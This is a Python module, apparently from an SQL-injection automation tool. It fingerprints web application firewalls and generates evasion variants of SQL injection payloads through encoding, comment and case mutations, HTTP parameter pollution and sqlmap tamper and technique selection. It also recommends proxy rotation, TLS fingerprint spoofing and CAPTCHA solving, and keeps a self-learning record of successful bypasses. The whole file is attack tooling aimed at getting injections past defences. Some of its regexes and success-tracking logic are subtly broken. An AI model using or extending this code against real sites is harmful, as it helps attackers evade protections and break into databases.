"""
Advanced WAF Intelligence Module v2.0
Upgraded with semantic mutation, behavioral analysis, and dynamic learning
"""
import re
import json
import hashlib
import random
import time
from enum import Enum, auto
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple, Any, Set
from datetime import datetime
from collections import defaultdict, Counter

from config import WAF_PATTERNS
from core.debug_logger import logger


class WAFType(Enum):
    """Advanced WAF fingerprinting"""
    CLOUDFLARE = auto()
    AWS_WAF = auto()
    AZURE_WAF = auto()
    AKAMAI = auto()
    IMPERVA = auto()
    MODSECURITY = auto()
    F5_BIG_IP = auto()
    SUCURI = auto()
    BARRACUDA = auto()
    FORTINET = auto()
    CITRIX = auto()
    UNKNOWN = auto()


@dataclass
class WAFBehaviorProfile:
    """Dynamic WAF behavior profile built from observations"""
    waf_type: WAFType
    detected_patterns: List[str] = field(default_factory=list)
    response_codes: Counter = field(default_factory=Counter)
    block_reasons: List[str] = field(default_factory=list)
    bypass_history: List[Dict] = field(default_factory=list)
    success_rate: Dict[str, float] = field(default_factory=dict)
    last_updated: datetime = field(default_factory=datetime.now)
    rate_limit_threshold: Optional[int] = None
    response_time_avg: float = 0.0
    challenge_complexity: str = "unknown"


class SemanticPayloadMutator:
    """
    Advanced semantic payload mutation engine
    Preserves SQL meaning while evading WAF detection
    """
    
    MUTATION_OPERATORS = {
        'encoding': {
            'url_encode': lambda x: ''.join(f'%{ord(c):02X}' for c in x),
            'double_url_encode': lambda x: ''.join(f'%25{ord(c):02X}' for c in x),
            'unicode_encode': lambda x: ''.join(f'%u{ord(c):04X}' for c in x),
            'base64': lambda x: __import__('base64').b64encode(x.encode()).decode(),
            'hex_encode': lambda x: '0x' + x.encode().hex(),
            'html_entities': lambda x: ''.join(f'&#{ord(c)};' for c in x),
        },
        'whitespace': {
            'space2comment': lambda x: x.replace(' ', '/**/'),
            'space2plus': lambda x: x.replace(' ', '+'),
            'space2random': lambda x: x.replace(' ', random.choice(['%09', '%0A', '%0B', '%0C', '%0D', '%A0'])),
            'tab_substitution': lambda x: x.replace(' ', '%09'),
            'newline_injection': lambda x: x.replace(' ', '%0A'),
        },
        'case': {
            'random_case': lambda x: ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in x),
            'upper_case': lambda x: x.upper(),
            'mixed_case': lambda x: ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(x)),
        },
        'comments': {
            'inline_comments': lambda x: re.sub(r'(\\b(SELECT|UNION|FROM|WHERE|AND|OR)\\b)', r'/**/\\1/**/', x, flags=re.IGNORECASE),
            'nested_comments': lambda x: x.replace('SELECT', 'SEL/**/ECT'),
            'conditional_comments': lambda x: x.replace('SELECT', '/*!50000SELECT*/'),
        },
        'operators': {
            'eq_to_like': lambda x: x.replace('=', ' LIKE '),
            'eq_to_rlike': lambda x: x.replace('=', ' RLIKE '),
            'and_to_ampersand': lambda x: re.sub(r'\\bAND\\b', '&&', x, flags=re.IGNORECASE),
            'or_to_pipe': lambda x: re.sub(r'\\bOR\\b', '||', x, flags=re.IGNORECASE),
        },
        'syntax': {
            'concat_split': lambda x: x.replace('CONCAT', 'CONCAT_WS(CHAR(32))'),
            'substr_alternative': lambda x: re.sub(r'SUBSTRING\\(([^,]+),([^,]+),([^)]+)\\)', r'MID(\\1 FROM \\2 FOR \\3)', x),
            'limit_offset': lambda x: re.sub(r'LIMIT\\s+(\\d+)\\s*,\\s*(\\d+)', r'LIMIT \\2 OFFSET \\1', x),
        }
    }
    
    def __init__(self):
        self.mutation_history = []
        self.successful_mutations = defaultdict(list)
        self.waf_specific_rules = defaultdict(list)
    
    def mutate_payload(self, payload: str, waf_type: str = None, intensity: int = 3) -> List[str]:
        """Generate semantically equivalent payload mutations"""
        mutations = []
        mutation_chains = []
        
        waf_enum = self._str_to_waftype(waf_type)
        if waf_type and waf_enum in self.waf_specific_rules:
            priority_ops = self.waf_specific_rules[waf_enum]
        else:
            priority_ops = random.sample(list(self.MUTATION_OPERATORS.keys()), 
                                       min(intensity, len(self.MUTATION_OPERATORS)))
        
        # Generate single mutations
        for category in priority_ops:
            if category in self.MUTATION_OPERATORS:
                for name, operator in self.MUTATION_OPERATORS[category].items():
                    try:
                        mutated = operator(payload)
                        if mutated != payload and mutated not in mutations:
                            mutations.append(mutated)
                            mutation_chains.append([name])
                    except Exception:
                        continue
        
        # Generate chained mutations
        for _ in range(min(intensity * 2, len(mutations))):
            if len(mutations) >= 2:
                base = random.choice(mutations[:10])
                second_op = random.choice([
                    self.MUTATION_OPERATORS['case']['random_case'],
                    self.MUTATION_OPERATORS['comments']['inline_comments'],
                    self.MUTATION_OPERATORS['whitespace']['space2comment']
                ])
                try:
                    compound = second_op(base)
                    if compound not in mutations:
                        mutations.append(compound)
                        mutation_chains.append(['chained', second_op.__name__])
                except Exception:
                    continue
        
        # Score and rank
        scored = []
        for mut, chain in zip(mutations, mutation_chains):
            score = self._score_mutation(mut, chain, waf_enum)
            scored.append((score, mut))
        
        scored.sort(reverse=True, key=lambda x: x[0])
        return [m[1] for m in scored[:20]]
    
    def _score_mutation(self, mutation: str, chain: List[str], waf_type: WAFType) -> float:
        """Score mutation based on bypass probability"""
        score = 0.5
        score += max(0, (100 - len(mutation)) / 200)
        score += len(chain) * 0.1
        
        if waf_type and waf_type in self.successful_mutations:
            for pattern in self.successful_mutations[waf_type]:
                if pattern in mutation or mutation in pattern:
                    score += 0.3
        
        obvious_patterns = ['union select', 'concat(', 'sleep(', 'benchmark(']
        for pattern in obvious_patterns:
            if pattern.lower() in mutation.lower():
                score -= 0.2
        
        return score
    
    def learn_from_result(self, original: str, mutation: str, waf_type: str, success: bool):
        """Learn from bypass attempt result"""
        waf_enum = self._str_to_waftype(waf_type)
        if success and waf_enum:
            self.successful_mutations[waf_enum].append(mutation)
            self.successful_mutations[waf_enum] = self.successful_mutations[waf_enum][-100:]
    
    def _str_to_waftype(self, waf_str: str) -> Optional[WAFType]:
        """Convert string to WAFType enum"""
        if not waf_str:
            return None
        try:
            return WAFType[waf_str.upper()]
        except KeyError:
            return WAFType.UNKNOWN


class HTTPParameterPollutionEngine:
    """Advanced HTTP Parameter Pollution (HPP) engine"""
    
    FRAMEWORK_BEHAVIORS = {
        'ASP.NET': {'duplicate_handling': 'concat_comma', 'delimiter': ',', 'vulnerable_to': ['js_injection', 'sql_concat']},
        'PHP': {'duplicate_handling': 'last_wins', 'delimiter': None, 'vulnerable_to': ['array_injection', 'type_juggling']},
        'JSP': {'duplicate_handling': 'first_wins', 'delimiter': None, 'vulnerable_to': ['parameter_hiding']},
        'Python': {'duplicate_handling': 'list_all', 'delimiter': None, 'vulnerable_to': ['list_manipulation']}
    }
    
    def __init__(self):
        self.pollution_patterns = defaultdict(list)
    
    def generate_hpp_payload(self, base_payload: str, target_framework: str = 'ASP.NET') -> Dict[str, Any]:
        """Generate HPP-based bypass payload"""
        if target_framework not in self.FRAMEWORK_BEHAVIORS:
            target_framework = 'ASP.NET'
        
        behavior = self.FRAMEWORK_BEHAVIORS[target_framework]
        
        if behavior['duplicate_handling'] == 'concat_comma':
            parts = self._split_for_concat(base_payload, behavior['delimiter'])
        elif behavior['duplicate_handling'] == 'last_wins':
            parts = [base_payload[:len(base_payload)//2], base_payload[len(base_payload)//2:]]
        else:
            parts = [base_payload]
        
        param_name = random.choice(['id', 'page', 'query', 'search', 'q'])
        params = [(param_name, part) for part in parts]
        
        return {
            'params': params,
            'framework': target_framework,
            'handling': behavior['duplicate_handling'],
            'explanation': f"WAF sees individual params, {target_framework} concatenates them",
            'expected_result': ''.join(parts),
            'bypass_probability': 0.85 if behavior['duplicate_handling'] == 'concat_comma' else 0.6
        }
    
    def _split_for_concat(self, payload: str, delimiter: str) -> List[str]:
        """Split payload to exploit comma concatenation"""
        if 'alert' in payload or 'prompt' in payload:
            return ["1'", payload.replace("'", ""), "'2"]
        else:
            mid = len(payload) // 2
            return [payload[:mid], payload[mid:]]


class BehavioralWAFAnalyzer:
    """Behavioral analysis engine for WAF detection and bypass"""
    
    def __init__(self):
        self.observed_behaviors = []
        self.response_time_baseline = None
        self.challenge_solutions = {}
    
    def analyze_response_behavior(self, response, response_time: float) -> Dict[str, Any]:
        """Analyze WAF behavior from HTTP response"""
        analysis = {
            'waf_detected': False,
            'waf_type': WAFType.UNKNOWN,
            'confidence': 0.0,
            'behaviors': [],
            'recommendations': []
        }
        
        headers = response.headers if hasattr(response, 'headers') else {}
        
        # CloudFlare indicators
        if any(h in headers for h in ['CF-RAY', 'CF-Cache-Status', '__cfduid']):
            analysis['waf_detected'] = True
            analysis['waf_type'] = WAFType.CLOUDFLARE
            analysis['confidence'] = 0.95
            analysis['behaviors'].append('cloudflare_proxy')
            analysis['recommendations'].extend([
                'Use TLS fingerprint spoofing',
                'Rotate User-Agent per request',
                'Implement cookie jar handling'
            ])
        
        # AWS WAF indicators
        if 'x-amzn-requestid' in headers or 'x-amzn-waf-action' in headers:
            analysis['waf_detected'] = True
            analysis['waf_type'] = WAFType.AWS_WAF
            analysis['confidence'] = 0.9
            analysis['behaviors'].append('aws_managed_rules')
        
        # Rate limiting detection
        if hasattr(response, 'status_code') and response.status_code == 429:
            analysis['behaviors'].append('rate_limited')
            analysis['recommendations'].extend([
                'Increase delay to 5-10 seconds',
                'Implement exponential backoff',
                'Use proxy rotation'
            ])
        
        # Challenge detection
        if hasattr(response, 'status_code') and response.status_code in [403, 503]:
            body = response.text[:5000].lower() if hasattr(response, 'text') else ''
            if any(x in body for x in ['checking your browser', 'js-challenge', 'cf-browser-verification']):
                analysis['behaviors'].append('js_challenge')
                analysis['recommendations'].append('Requires JavaScript execution or session cookies')
            if 'captcha' in body or 'recaptcha' in body:
                analysis['behaviors'].append('captcha_challenge')
                analysis['recommendations'].append('CAPTCHA solving service required')
        
        # Timing analysis
        if self.response_time_baseline and response_time > self.response_time_baseline * 3:
            analysis['behaviors'].append('slow_response')
            analysis['recommendations'].append('Possible deliberate delay - WAF may be analyzing request')
        
        return analysis
    
    def build_behavioral_profile(self, target_url: str, sample_count: int = 5) -> WAFBehaviorProfile:
        """Build comprehensive WAF behavioral profile through probing"""
        profile = WAFBehaviorProfile(waf_type=WAFType.UNKNOWN)
        
        # Note: Actual HTTP requests would be made here
        # For now, return empty profile for later population
        return profile
    
    def _classify_from_behaviors(self, profile: WAFBehaviorProfile) -> WAFType:
        """Classify WAF type from observed behaviors"""
        if 'cloudflare_proxy' in profile.behaviors:
            return WAFType.CLOUDFLARE
        if 'aws_managed_rules' in profile.behaviors:
            return WAFType.AWS_WAF
        if profile.response_codes[403] > 2:
            return WAFType.MODSECURITY
        return WAFType.UNKNOWN


class DynamicKnowledgeBase:
    """Self-learning knowledge base for WAF bypass techniques"""
    
    def __init__(self, storage_path: str = "memory/waf_knowledge.json"):
        self.storage_path = storage_path
        self.knowledge = {
            'waf_profiles': {},
            'successful_bypasses': [],
            'tamper_effectiveness': {},
            'payload_patterns': {},
            'framework_behaviors': {}
        }
        self._load_knowledge()
    
    def _load_knowledge(self):
        """Load persisted knowledge"""
        try:
            import os
            if os.path.exists(self.storage_path):
                with open(self.storage_path, 'r') as f:
                    self.knowledge = json.load(f)
        except Exception as e:
            logger.warning("WAF_KB", f"Could not load knowledge: {e}")
    
    def save_knowledge(self):
        """Persist knowledge to disk"""
        try:
            with open(self.storage_path, 'w') as f:
                json.dump(self.knowledge, f, indent=2, default=str)
        except Exception as e:
            logger.error("WAF_KB", f"Could not save knowledge: {e}")
    
    def record_success(self, waf_type: str, technique: str, payload: str, context: Dict):
        """Record successful bypass"""
        entry = {
            'timestamp': datetime.now().isoformat(),
            'waf_type': waf_type,
            'technique': technique,
            'payload_hash': hashlib.md5(payload.encode()).hexdigest()[:16],
            'payload_pattern': self._extract_pattern(payload),
            'context': context
        }
        
        self.knowledge['successful_bypasses'].append(entry)
        
        if technique not in self.knowledge['tamper_effectiveness']:
            self.knowledge['tamper_effectiveness'][technique] = {'successes': 0, 'attempts': 0, 'rate': 0.0}
        
        self.knowledge['tamper_effectiveness'][technique]['successes'] += 1
        self.knowledge['tamper_effectiveness'][technique]['attempts'] += 1
        self.knowledge['tamper_effectiveness'][technique]['rate'] = (
            self.knowledge['tamper_effectiveness'][technique]['successes'] /
            self.knowledge['tamper_effectiveness'][technique]['attempts']
        )
        
        self.knowledge['successful_bypasses'] = self.knowledge['successful_bypasses'][-1000:]
        self.save_knowledge()
    
    def get_recommended_techniques(self, waf_type: str) -> List[Tuple[str, float]]:
        """Get techniques ranked by effectiveness for specific WAF"""
        techniques = []
        for tech, stats in self.knowledge['tamper_effectiveness'].items():
            if stats['attempts'] > 0:
                techniques.append((tech, stats['rate']))
        techniques.sort(key=lambda x: x[1], reverse=True)
        return techniques[:10]
    
    def _extract_pattern(self, payload: str) -> str:
        """Extract generic pattern from payload for matching"""
        pattern = re.sub(r'\\d+', '{num}', payload)
        pattern = re.sub(r"'[^']*'", "'{str}'", pattern)
        pattern = re.sub(r'"[^"]*"', '"{str}"', pattern)
        return pattern


class WAFIntelligence:
    """
    Advanced WAF detection and bypass recommendation engine
    Upgraded with semantic mutation, behavioral analysis, and dynamic learning
    """
    
    # WAF-specific tamper combinations
    TAMPER_COMBINATIONS = {
        WAFType.CLOUDFLARE: [
            ['randomcomments', 'space2comment', 'chardoubleencode'],
            ['base64encode', 'between'],
            ['randomcase', 'space2randomblank', 'percentage'],
        ],
        WAFType.AWS_WAF: [
            ['space2randomblank', 'randomcase'],
            ['charencode', 'space2comment'],
            ['unicodeencode', 'randomcomments'],
        ],
        WAFType.MODSECURITY: [
            ['modsecurityversioned', 'space2comment'],
            ['between', 'randomcomments'],
            ['charunicodeencode', 'apostrophemask'],
        ],
        WAFType.AKAMAI: [
            ['randomcomments', 'space2plus'],
            ['apostrophemask', 'space2comment'],
            ['chardoubleencode', 'randomcase'],
        ],
        WAFType.UNKNOWN: [
            ['space2comment', 'randomcase'],
            ['charencode'],
            ['randomcomments']
        ]
    }
    
    def __init__(self):
        """Initialize advanced WAF intelligence components"""
        self.patterns = WAF_PATTERNS
        self.mutator = SemanticPayloadMutator()
        self.hpp_engine = HTTPParameterPollutionEngine()
        self.behavioral_analyzer = BehavioralWAFAnalyzer()
        self.knowledge_base = DynamicKnowledgeBase()
        
        logger.debug("WAF", "Advanced intelligence engine loaded", {
            "patterns": len(self.patterns),
            "mutation_operators": sum(len(ops) for ops in self.mutator.MUTATION_OPERATORS.values()),
            "hpp_frameworks": len(self.hpp_engine.FRAMEWORK_BEHAVIORS)
        })
    
    def detect_waf(self, logs: List[str]) -> Optional[Dict]:
        """
        Enhanced WAF detection with behavioral analysis
        Same function signature, upgraded internals
        """
        text = '\\n'.join(logs).lower()
        
        # Original pattern-based detection
        for waf_type, data in self.patterns.items():
            for pattern in data['patterns']:
                if pattern.lower() in text:
                    logger.info("WAF", f"Detected: {waf_type}", {"pattern": pattern})
                    
                    # Get enhanced recommendations
                    enhanced_data = self._get_enhanced_data(waf_type)
                    
                    return {
                        'detected': True,
                        'waf_type': waf_type,
                        'tampers': enhanced_data['tampers'],
                        'techniques': enhanced_data['techniques'],
                        'recommendation': enhanced_data['recommendation'],
                        'mutation_variants': enhanced_data.get('mutation_variants', []),
                        'hpp_compatible': enhanced_data.get('hpp_compatible', False)
                    }
        
        return None
    
    def get_bypass_modifications(self, waf_type: str) -> List[str]:
        """
        Enhanced bypass modifications with intelligent tamper selection
        Same function signature, upgraded internals
        """
        if waf_type not in self.patterns:
            return []
        
        waf = self.patterns[waf_type]
        mods = []
        
        # Get knowledge-based recommendations first
        recommended = self.knowledge_base.get_recommended_techniques(waf_type)
        if recommended:
            # Use top recommended tamper
            top_tamper = recommended[0][0]
            mods.extend(['--tamper', top_tamper])
        elif waf['tampers']:
            # Fallback to static config
            mods.extend(['--tamper', ','.join(waf['tampers'][:3])])
        
        # Add delay for rate-limiting WAFs
        if waf_type in ['cloudflare', 'rate_limit', 'aws_waf']:
            delay = self._calculate_delay(waf_type)
            mods.extend(['--delay', str(delay)])
        
        # REMOVED: --threads for single-threaded execution
        # if waf_type in ['cloudflare', 'incapsula', 'akamai']:
        #     mods.extend(['--threads', '1'])
        
        mods.append('--random-agent')
        
        # Add technique selection based on WAF type
        technique = self._select_technique(waf_type)
        mods.extend(['--technique', technique])
        
        logger.debug("WAF", f"Generated enhanced bypass for {waf_type}", {"mods": mods})
        return mods
    
    def _get_enhanced_data(self, waf_type: str) -> Dict:
        """Get enhanced WAF data with mutations and alternatives"""
        base_data = self.patterns[waf_type].copy()
        
        # Generate mutation variants
        test_payload = "' OR '1'='1"
        mutations = self.mutator.mutate_payload(test_payload, waf_type, intensity=3)
        
        # Check HPP compatibility
        hpp_data = self.hpp_engine.generate_hpp_payload(test_payload)
        
        base_data['mutation_variants'] = mutations[:5]
        base_data['hpp_compatible'] = hpp_data['bypass_probability'] > 0.6
        base_data['hpp_frameworks'] = list(self.hpp_engine.FRAMEWORK_BEHAVIORS.keys())
        
        return base_data
    
    def _calculate_delay(self, waf_type: str) -> int:
        """Calculate optimal delay based on WAF type"""
        delays = {
            'cloudflare': 3,
            'aws_waf': 4,
            'akamai': 2,
            'mod_security': 1,
            'incapsula': 3,
            'rate_limit': 5
        }
        return delays.get(waf_type, 3)
    
    def _select_technique(self, waf_type: str) -> str:
        """Select optimal SQLMap technique based on WAF"""
        technique_map = {
            'cloudflare': 'BT',      # Boolean + Time (stealthiest)
            'aws_waf': 'BT',         # Boolean + Time
            'akamai': 'EUBT',        # Error + Union + Boolean + Time
            'mod_security': 'EUS',   # Error + Union + Stacked
            'incapsula': 'BT',       # Boolean + Time
            'unknown': 'BEUSTQ'      # All techniques
        }
        return technique_map.get(waf_type, 'BEUSTQ')
    
    def generate_intelligent_bypass(self, target_url: str, base_payload: str, 
                                   waf_type: str = None) -> Dict[str, Any]:
        """
        NEW: Generate comprehensive intelligent bypass strategy
        """
        # Detect WAF if not specified
        if not waf_type:
            # Would probe target here
            waf_type = 'unknown'
        
        # Get knowledge-based recommendations
        recommended = self.knowledge_base.get_recommended_techniques(waf_type)
        
        # Generate semantic mutations
        mutations = self.mutator.mutate_payload(base_payload, waf_type, intensity=3)
        
        # Generate HPP variant
        hpp_variant = self.hpp_engine.generate_hpp_payload(base_payload)
        
        # Get tamper strategy
        waf_enum = WAFType[waf_type.upper()] if waf_type.upper() in [e.name for e in WAFType] else WAFType.UNKNOWN
        tamper_sets = self.TAMPER_COMBINATIONS.get(waf_enum, self.TAMPER_COMBINATIONS[WAFType.UNKNOWN])
        
        return {
            'waf_type': waf_type,
            'confidence': 0.8 if waf_type != 'unknown' else 0.5,
            'primary_payload': mutations[0] if mutations else base_payload,
            'alternative_payloads': mutations[1:5] if len(mutations) > 1 else [],
            'hpp_variant': hpp_variant,
            'tamper_scripts': tamper_sets[0],
            'alternative_tampers': tamper_sets[1:],
            'recommended_delay': self._calculate_delay(waf_type),
            'technique': self._select_technique(waf_type),
            'knowledge_based': len(recommended) > 0,
            'top_techniques': [t[0] for t in recommended[:3]]
        }
    
    def learn_from_attempt(self, target: str, payload: str, waf_type: str, 
                          success: bool, response_data: Dict):
        """NEW: Learn from bypass attempt to improve future strategies"""
        # Update knowledge base
        self.knowledge_base.record_success(
            waf_type=waf_type,
            technique=','.join(self.TAMPER_COMBINATIONS.get(
                WAFType[waf_type.upper()] if waf_type.upper() in [e.name for e in WAFType] else WAFType.UNKNOWN, 
                ['unknown']
            )[0]),
            payload=payload,
            context=response_data
        )
        
        # Update mutator
        self.mutator.learn_from_result(payload, payload, waf_type, success)
    
    def mutate_payload(self, payload: str, waf_type: str = None, intensity: int = 3) -> List[str]:
        """NEW: Public interface for payload mutation"""
        return self.mutator.mutate_payload(payload, waf_type, intensity)
    
    def analyze_behavior(self, response, response_time: float) -> Dict[str, Any]:
        """NEW: Public interface for behavioral analysis"""
        return self.behavioral_analyzer.analyze_response_behavior(response, response_time)

waf_intel = WAFIntelligence()